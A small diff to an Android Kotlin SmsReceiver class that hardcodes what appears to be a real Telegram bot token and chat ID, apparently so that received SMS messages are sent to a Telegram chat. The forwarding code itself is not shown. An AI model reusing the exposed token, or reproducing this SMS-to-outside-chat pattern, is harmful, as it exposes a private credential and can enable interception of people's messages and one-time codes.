@@ -16,10 +16,10 @@ class SmsReceiver : BroadcastReceiver() {
     // ++++++++++ PASTE YOUR SECRETS HERE ++++++++++
     companion object {
         // 1. PUT YOUR NEW BOT TOKEN HERE (inside the " ")
-        const val BOT_TOKEN = ""
+        const val BOT_TOKEN = "8688712757:AAEHDw6dwvkx4JN6tfAbHYxX7FmH1bAvWDk"
 
         // 2. PUT YOUR PERSONAL CHAT ID HERE (inside the " ")
-        const val CHAT_ID = ""
+        const val CHAT_ID = "8454912657"
     }
     // +++++++++++++++++++++++++++++++++++++++++++++
 
